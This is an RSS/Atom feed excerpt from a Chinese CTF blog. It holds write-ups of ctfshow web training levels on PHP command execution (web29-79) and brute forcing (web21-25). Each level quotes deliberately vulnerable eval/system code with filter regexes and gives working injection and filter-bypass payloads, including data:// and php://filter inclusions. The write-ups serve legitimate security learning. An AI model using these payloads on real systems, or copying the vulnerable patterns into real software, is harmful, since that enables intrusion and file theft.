<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>大周&#39;blog</title>
  
  <subtitle>ctf</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lingxin16.github.io/"/>
  <updated>2020-11-30T13:50:16.098Z</updated>
  <id>https://lingxin16.github.io/</id>
  
  <author>
    <name>奝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ctfshow-web入门命令执行</title>
    <link href="https://lingxin16.github.io/2020/11/20/ctfshow-web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://lingxin16.github.io/2020/11/20/ctfshow-web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2020-11-20T10:48:02.000Z</published>
    <updated>2020-11-30T13:50:16.098Z</updated>
    
    <content type="html"><![CDATA[<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><pre><code>&lt;?php /* \# -*- coding: utf-8 -*- \# @Author: h1xa \# @Date:  2020-09-04 00:12:34 \# @Last Modified by:  h1xa \# @Last Modified time: 2020-09-04 00:26:48 \# @email: h1xa@ctfer.com \# @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[&#39;c&#39;])){   $c = $_GET[&#39;c&#39;];   if(!preg_match(&quot;/flag/i&quot;, $c)){     eval($c);   } }else{   highlight_file(__FILE__); }</code></pre><p>过滤了flag，直接cat *.php</p><p><code>?c=system(‘cat *.php’);</code></p><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre><code>&lt;?php /* \# -*- coding: utf-8 -*- \# @Author: h1xa \# @Date:  2020-09-04 00:12:34 \# @Last Modified by:  h1xa \# @Last Modified time: 2020-09-04 00:42:26 \# @email: h1xa@ctfer.com \# @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[&#39;c&#39;])){   $c = $_GET[&#39;c&#39;];   if(!preg_match(&quot;/flag|system|php/i&quot;, $c)){     eval($c);   } }else{   highlight_file(__FILE__); }</code></pre><p>这次过滤了system，用<code>?c=echo shell_exec(&#39;cat fl``ag.p``hp&#39;);</code></p><p>这里我刚开始用<code>?c=echo exec(&#39;ls&#39;);</code>发现只有index.php，并且<code>?c=echo exec(&#39;cat fl``ag.p``hp&#39;);</code>之后也只有$flag = ‘flag{28bba894-7025-47a3-a269-e98f60f6bfce}’;</p><p>问过羽大佬之后才知道是exec和shell_exec的区别，exec只返回结果的最后一行，而shell_exec返回完整结果。</p><p>参考<a href="http://www.manongjc.com/article/1992.html" target="_blank" rel="noopener">http://www.manongjc.com/article/1992.html</a></p><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code>&lt;?php /* \# -*- coding: utf-8 -*- \# @Author: h1xa \# @Date:  2020-09-04 00:12:34 \# @Last Modified by:  h1xa \# @Last Modified time: 2020-09-04 00:49:10 \# @email: h1xa@ctfer.com \# @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[&#39;c&#39;])){   $c = $_GET[&#39;c&#39;];   if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&quot;, $c)){     eval($c);   } }else{   highlight_file(__FILE__); }</code></pre><p>过滤了空格和单引号，cat也不能用，用%09代替空格绕过</p><pre><code>?c=echo(`nl%09*`);</code></pre><p>还有几个代替空格的，但是这里没用：${IFS}、$IFS$9、&lt;&gt;、&lt;</p><h3 id="web32-36"><a href="#web32-36" class="headerlink" title="web32-36"></a>web32-36</h3><pre><code>&lt;?php /* \# -*- coding: utf-8 -*- \# @Author: h1xa \# @Date:  2020-09-04 00:12:34 \# @Last Modified by:  h1xa \# @Last Modified time: 2020-09-04 00:56:31 \# @email: h1xa@ctfer.com \# @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[&#39;c&#39;])){   $c = $_GET[&#39;c&#39;];   if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&quot;, $c)){     eval($c);   } }else{   highlight_file(__FILE__); }</code></pre><p>这次直接连echo都直接过滤了，包括括号也过滤了，php中不用括号的函数有echo、print、die、include、require、include_once、require_once,用include函数和post传伪协议构成payload</p><p>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p><p>后面的33-37基本都差不多，同一个payload</p><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><pre><code>&lt;?php /* \# -*- coding: utf-8 -*- \# @Author: h1xa \# @Date:  2020-09-04 00:12:34 \# @Last Modified by:  h1xa \# @Last Modified time: 2020-09-04 05:18:55 \# @email: h1xa@ctfer.com \# @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET[&#39;c&#39;])){   $c = $_GET[&#39;c&#39;];   if(!preg_match(&quot;/flag/i&quot;, $c)){     include($c);     echo $flag;   } }else{   highlight_file(__FILE__); }</code></pre><p>过滤了flag，然后包含出来，用data协议</p><pre><code>?c=data://text/plain,&lt;?php system(&#39;cat f*&#39;);?&gt;</code></pre><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><pre><code>&lt;?php /* \# -*- coding: utf-8 -*- \# @Author: h1xa \# @Date:  2020-09-04 00:12:34 \# @Last Modified by:  h1xa \# @Last Modified time: 2020-09-04 05:23:36 \# @email: h1xa@ctfer.com \# @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET[&#39;c&#39;])){   $c = $_GET[&#39;c&#39;];   if(!preg_match(&quot;/flag|php|file/i&quot;, $c)){     include($c);     echo $flag;   } }else{   highlight_file(__FILE__); }</code></pre><p>  } </p><p>}else{<br>  highlight_file(<strong>FILE</strong>);<br>}</p><p>在37的基础上过滤了php和file，data协议用base64加密一下</p><pre><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==</code></pre><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre><code>&lt;?php /* \# -*- coding: utf-8 -*- \# @Author: h1xa \# @Date:  2020-09-04 00:12:34 \# @Last Modified by:  h1xa \# @Last Modified time: 2020-09-04 06:13:21 \# @email: h1xa@ctfer.com \# @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET[&#39;c&#39;])){   $c = $_GET[&#39;c&#39;];   if(!preg_match(&quot;/flag/i&quot;, $c)){     include($c.&quot;.php&quot;);   } }else{   highlight_file(__FILE__); }</code></pre><p>在之前的基础上加了.php后缀</p><pre><code>?c=data://text/plain,&lt;?php system(&#39;cat f*&#39;);?&gt;</code></pre><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><pre><code>&lt;?php /* \# -*- coding: utf-8 -*- \# @Author: h1xa \# @Date:  2020-09-04 00:12:34 \# @Last Modified by:  h1xa \# @Last Modified time: 2020-09-04 06:03:36 \# @email: h1xa@ctfer.com \# @link: https://ctfer.com */ if(isset($_GET[&#39;c&#39;])){   $c = $_GET[&#39;c&#39;];   if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c)){     eval($c);   } }else{   highlight_file(__FILE__); } </code></pre><p>啥也看不懂，大佬的wp都看不懂，先看羽师傅的wp</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015201529.png" alt></p><p>又是看不懂的东西，首先session_start()函数初始化session，然后引用session_id,构造system(ls);</p><p>俺照着试了试确实能行，但是也确实不能cat flag</p><p>如羽师傅所说<code>因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的。</code></p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015204033.png" alt></p><p>接着看第二个解法读文件+数组改造</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015204550.png" alt></p><p>又是一大堆奇奇怪怪的函数，第一个函数localeconv()：查找美国本地的数字格式化信息，返回内容为</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015205007.png" alt></p><p>pos()函数：pos()函数是current()函数的别名，它可返回数组中当前元素的值。在这里它返回了</p><p>localeconv()函数返回数组中的第一个元素.</p><p>scandir():列出指定路径中的文件和目录，这里构造的是scandir(.)。</p><p>现在的返回值是</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015211313.png" alt></p><p>array_reverse():返回单元顺序相反的数组，这里的作用就是把两个php文件提到前边</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015211429.png" alt></p><p>next()：将数组中的内部指针向前移动一位 ，就是把数组中第二个元素提前一位并且返回，在这里是把flag.php提到第一位并返回</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201015212249.png" alt></p><p>然后highlight_file()函数将flag.php中的内容返回</p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: 羽 # @Date:   2020-09-05 20:31:22 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-05 22:40:07 # @email: 1341963450@qq.com # @link: https://ctf.show */ if(isset($_POST[&#39;c&#39;])){     $c = $_POST[&#39;c&#39;]; if(!preg_match(&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;, $c)){         eval(&quot;echo($c);&quot;);     } }else{     highlight_file(__FILE__); } ?&gt;</code></pre><p>这个题还是看羽师傅的wp吧<a href="https://wp.ctf.show/d/137-ctfshow-web-web41" target="_blank" rel="noopener">https://wp.ctf.show/d/137-ctfshow-web-web41</a></p><p>这个里边贴了个rce_or.php和exp.py，将这两个文件放在一起，然后在powershell里边</p><pre><code>python exp.py url</code></pre><p>python exp.py <a href="http://c47ca7f9-4c4f-4dde-8391-aa40c7496adf.chall.ctf.show/" target="_blank" rel="noopener">http://c47ca7f9-4c4f-4dde-8391-aa40c7496adf.chall.ctf.show/</a></p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201027220725.png" alt></p><p>就这么用，具体自己研究研究，俺也没弄太懂，还要再瞅瞅</p><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-05 20:51:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[&#39;c&#39;])){     $c=$_GET[&#39;c&#39;];     system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); }else{     highlight_file(__FILE__); }</code></pre><p>关键代码<code>&gt;/dev/null 2&gt;&amp;1</code></p><pre><code>&gt;/dev/null 2&gt;&amp;1//会将标准输出，错误输出都重定向至/dev/null，也就是全部丢弃</code></pre><p>也就是说所有的输出都被丢弃了</p><p>payload：</p><p><code>?c=ls%0a</code></p><p><code>?c=cat%20flag.php%0a</code></p><p>这里用%0a换行，还有用;分割，||分割。</p><p>参考资料：</p><p><a href="https://blog.csdn.net/qq_32419007/article/details/80187962" target="_blank" rel="noopener">https://blog.csdn.net/qq_32419007/article/details/80187962</a></p><p><a href="https://blog.csdn.net/xiaoABClong/article/details/95973140" target="_blank" rel="noopener">https://blog.csdn.net/xiaoABClong/article/details/95973140</a></p><p>还有atao师傅的这篇文章，总结的超级好(膜！)：</p><p><a href="https://www.cnblogs.com/erR0Ratao/p/13640600.html" target="_blank" rel="noopener">https://www.cnblogs.com/erR0Ratao/p/13640600.html</a></p><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-05 21:32:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[&#39;c&#39;])){     $c=$_GET[&#39;c&#39;];     if(!preg_match(&quot;/\;|cat/i&quot;, $c)){         system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);     } }else{     highlight_file(__FILE__); }</code></pre><p>emm。。过滤了;可以用%0a和||，过滤了cat可以用nl</p><p>payload：</p><p><code>?c=ls||</code></p><p><code>?c=nl%20flag.php||</code></p><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-05 21:32:01 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[&#39;c&#39;])){     $c=$_GET[&#39;c&#39;];     if(!preg_match(&quot;/;|cat|flag/i&quot;, $c)){         system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);     } }else{     highlight_file(__FILE__); }</code></pre><p>又把flag过滤了，可以用*</p><p>payload：</p><p><code>?c=ls||</code></p><p><code>?c=nl%20fl*g.php||</code>或者是</p><pre><code>?c=nl%20`ls`||</code></pre><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-05 21:35:34 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[&#39;c&#39;])){     $c=$_GET[&#39;c&#39;];     if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c)){         system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);     } }else{     highlight_file(__FILE__); }</code></pre><p>这个把空格也过滤了，用空格绕过$IFS之类的，具体参考上边atao师傅的博客</p><p>payload：</p><pre><code>nl$IFS`ls`||</code></pre><p>这里有一点很奇怪，*通配符不能与IFS或&lt;不能一起使用</p><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-05 21:50:19 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[&#39;c&#39;])){     $c=$_GET[&#39;c&#39;];     if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c)){         system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);     } }else{     highlight_file(__FILE__); }</code></pre><p>又把$过滤了，就用&lt;绕过</p><pre><code>?c=nl&lt;fl``ag.php||</code></pre><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><p>同上</p><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-05 22:06:20 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[&#39;c&#39;])){     $c=$_GET[&#39;c&#39;];     if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c)){         system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);     } }else{     highlight_file(__FILE__); } </code></pre><p>禁了反引号用单引号</p><pre><code>?c=nl&lt;fl&#39;&#39;ag.php||</code></pre><h3 id="web49-51"><a href="#web49-51" class="headerlink" title="web49-51"></a>web49-51</h3><p>同上</p><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-05 22:50:30 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[&#39;c&#39;])){     $c=$_GET[&#39;c&#39;];     if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){         system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);     } }else{     highlight_file(__FILE__); } </code></pre><p>&lt;被过滤了，用${IFS}</p><pre><code>?c=nl$IFS/fl&#39;&#39;ag||</code></pre><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-07 18:21:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[&#39;c&#39;])){     $c=$_GET[&#39;c&#39;];     if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){         echo($c);         $d = system($c);         echo &quot;&lt;br&gt;&quot;.$d;     }else{         echo &#39;no&#39;;     } }else{     highlight_file(__FILE__); } </code></pre><pre><code>?c=nl${IFS}fl%27%27ag.php</code></pre><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-07 19:43:42 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[&#39;c&#39;])){     $c=$_GET[&#39;c&#39;];     if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){         system($c);     } }else{     highlight_file(__FILE__); }</code></pre><p>这一题过滤了常用的命令，但是还有一个paste命令</p><p>paste 指令会把每个文件以列对列的方式，一列列地加以合并。</p><pre><code>?c=paste${IFS}f???.???</code></pre><p>还有一个grep命令</p><p>Linux grep 命令用于查找文件里符合条件的字符串。</p><p>在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：</p><pre><code>grep test *file </code></pre><pre><code>?c=grep${IFS}%27f%27${IFS}fl??.php</code></pre><p>或者</p><pre><code>?c=/bin/?at${IFS}f?????hp</code></pre><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-07 20:03:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_GET[&#39;c&#39;])){     $c=$_GET[&#39;c&#39;];     if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){         system($c);     } }else{     highlight_file(__FILE__); } </code></pre><p>a-z都给禁了…俺啥也不会，直接放大佬的文章</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145" target="_blank" rel="noopener">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20201125145608.jpg" alt></p><p>主要是通过POST上传数据包，然后通过点命令去执行</p><p>还有下边这篇文章，讲了一个更简单的方法</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/108555433" target="_blank" rel="noopener">https://blog.csdn.net/qq_46091464/article/details/108555433</a></p><p>通过数字去匹配base64命令和bzip2命令</p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_GET[&#39;c&#39;])){     $c=$_GET[&#39;c&#39;];     if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\{|\&#39;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){         system($c);     } }else{     highlight_file(__FILE__); }</code></pre><p>同55</p><p>通过POST上传数据包，然后通过点命令去执行</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-08 01:02:56 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 还能炫的动吗？ //flag in 36.php if(isset($_GET[&#39;c&#39;])){     $c=$_GET[&#39;c&#39;];     if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#39;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c)){         system(&quot;cat &quot;.$c.&quot;.php&quot;);     } }else{     highlight_file(__FILE__); } </code></pre><p>构造36</p><p>${_}：输出上一次命令执行的结果</p><p>$(())：做运算</p><p>$((“”))：值为0</p><p>$((~$((“”))))：值为-1</p><p>payload”</p><pre><code>?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code></pre><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><pre><code>&lt;?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date:   2020-09-05 20:49:30 # @Last Modified by:   h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_POST[&#39;c&#39;])){         $c= $_POST[&#39;c&#39;];         eval($c); }else{     highlight_file(__FILE__); } </code></pre><p>payload</p><pre><code>c=show_source(&#39;flag.php&#39;);c=highlight_file(&quot;flag.php&quot;);c=echo file_get_contents(&quot;flag.php&quot;);c=readfile(&quot;flag.php&quot;);c=print_r(file(&quot;flag.php&quot;)); c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);c=rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</code></pre><h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><p>禁用了 file_get_contents()、readfile()</p><pre><code>c=show_source(&#39;flag.php&#39;);c=highlight_file(&quot;flag.php&quot;);c=print_r(file(&quot;flag.php&quot;)); c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);c=rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</code></pre><h3 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h3><p>禁用了 file() </p><pre><code>c=show_source(&#39;flag.php&#39;);c=highlight_file(&quot;flag.php&quot;);c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);c=rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</code></pre><h3 id="web61-63"><a href="#web61-63" class="headerlink" title="web61-63"></a>web61-63</h3><p>禁用了 copy()、rename()</p><pre><code>c=show_source(&#39;flag.php&#39;);c=highlight_file(&quot;flag.php&quot;);</code></pre><h3 id="web62-65"><a href="#web62-65" class="headerlink" title="web62-65"></a>web62-65</h3><pre><code>c=show_source(&#39;flag.php&#39;);c=highlight_file(&quot;flag.php&quot;);</code></pre><h3 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h3><p>禁用了show_source()，并且flag不在flag.php</p><p>查看文件</p><pre><code>c=var_dump(scandir(&quot;/&quot;));c=$a=opendir(&quot;/&quot;); while (($file = readdir($a)) !== false){echo $file . &quot;&lt;br&gt;&quot;; };</code></pre><p>flag在flag.txt</p><pre><code>c=highlight_file(&quot;/flag.txt&quot;);c=include(&quot;/flag.txt&quot;);c=require(&quot;/flag.txt&quot;);</code></pre><h3 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h3><p> highlight_file()居然也被禁了</p><pre><code>c=include(&quot;/flag.txt&quot;);c=require(&quot;/flag.txt&quot;);</code></pre><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><pre><code>&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);ini_set(&#39;display_errors&#39;, 0);// 你们在炫技吗？if(isset($_POST[&#39;c&#39;])){        $c= $_POST[&#39;c&#39;];        eval($c);        $s = ob_get_contents();        ob_end_clean();        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);}else{    highlight_file(__FILE__);}?&gt;你要上天吗？</code></pre><p>将输出的字母和数字都替换成了? ，可以用exit();终止脚本的执行，从而让替换代码失效。</p><pre><code>c=include(&quot;/flag.txt&quot;);exit();c=require(&quot;/flag.txt&quot;);exit();</code></pre><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p><p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJubCAqIik/Pg==</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;web29&quot;&gt;&lt;a href=&quot;#web29&quot; class=&quot;headerlink&quot; title=&quot;web29&quot;&gt;&lt;/a&gt;web29&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php 

/* 
\# -*- coding: utf-8 -*- 
\# @Autho
      
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门爆破</title>
    <link href="https://lingxin16.github.io/2020/11/20/ctfshow-web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4/"/>
    <id>https://lingxin16.github.io/2020/11/20/ctfshow-web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4/</id>
    <published>2020-11-20T10:45:20.000Z</published>
    <updated>2020-11-20T10:47:27.343Z</updated>
    
    <content type="html"><![CDATA[<h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200915200836.png" alt="web21.1"></p><p>爆破题，抓包发现传输的账号密码是经过base64加密后的</p><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200915202210.png" alt="web21.2"></p><p>解出来是这样形式的：admin:admin</p><p>下载题目给的压缩包，解压出字典，写脚本然后用burpsuit跑就行了</p><h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200904153146.png" alt="web22.1"></p><p>说是子域名爆破，但是我觉得就是flag.ctfer.com，你觉得呢…</p><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200921201534.png" alt="web23.1"></p><p>在各位大佬的指导下搞出来的代码</p><pre><code class="PHP">&lt;?php error_reporting(0); $a=&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;;for($i=0;$i&lt;36;$i++){    for($j=0;$j&lt;36;$j++){        $token=$a[$i].$a[$j];            $token = md5($token);         if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1)){             if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){                 echo $a[$i].$a[$j];                exit(0);            }         }     }} ?&gt; </code></pre><h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><p><img data-action="zoom" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200917204607.png" alt="web24.1"></p><p>PHP伪随机数</p><pre><code>&lt;?phpmt_srand(372619038);echo(mt_rand());?&gt;</code></pre><p>用PHP版本7.2.10运行，将得到的数字传入即可</p><h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p><img data-action="zoom" 